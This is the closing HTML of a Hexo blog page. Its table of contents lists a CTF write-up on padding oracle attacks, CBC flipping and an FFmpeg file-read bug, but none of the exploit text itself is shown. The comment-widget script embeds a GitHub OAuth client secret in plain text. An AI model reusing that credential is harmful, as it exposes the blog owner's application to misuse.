+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CTF" >
+    <span class="tag-code">CTF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/09/27/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E4%B8%80/">
+        <span class="nav-arrow">← </span>
+        
+          buuoj刷题笔记[CISCN2019(一)]
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/09/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%8D%95%E9%93%BE%E8%A1%A8%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/">
+        
+          数据结构 | 单链表增删改查
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CISCN2019-总决赛-Day2-Web1-Easyweb"><span class="toc-nav-text">[CISCN2019 总决赛 Day2 Web1]Easyweb</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#EXP"><span class="toc-nav-text">EXP</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#padding-oracle"><span class="toc-nav-text">padding oracle</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#服务器解密过程"><span class="toc-nav-text">服务器解密过程</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#padding-oracle攻击的本质"><span class="toc-nav-text">padding oracle攻击的本质</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#padding添加原理"><span class="toc-nav-text">padding添加原理</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#服务器验证明文正确方式"><span class="toc-nav-text">服务器验证明文正确方式</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#逻辑"><span class="toc-nav-text">逻辑</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CISCN2019-东北赛区-Day2-Web3-Point-System"><span class="toc-nav-text">[CISCN2019 东北赛区 Day2 Web3]Point System</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#考点"><span class="toc-nav-text">考点</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#meta的作用"><span class="toc-nav-text">meta的作用</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#padding-oracle攻击思路"><span class="toc-nav-text">padding oracle攻击思路</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#解密exp"><span class="toc-nav-text">解密exp</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#exp-CBC翻转"><span class="toc-nav-text">exp CBC翻转</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#FFMpeg漏洞读取文件"><span class="toc-nav-text">FFMpeg漏洞读取文件</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/09/28/buuoj刷题笔记-CISCN2019-二-padding-oracle初学/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "buuoj刷题笔记[CISCN2019(二)]padding oracle初学",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
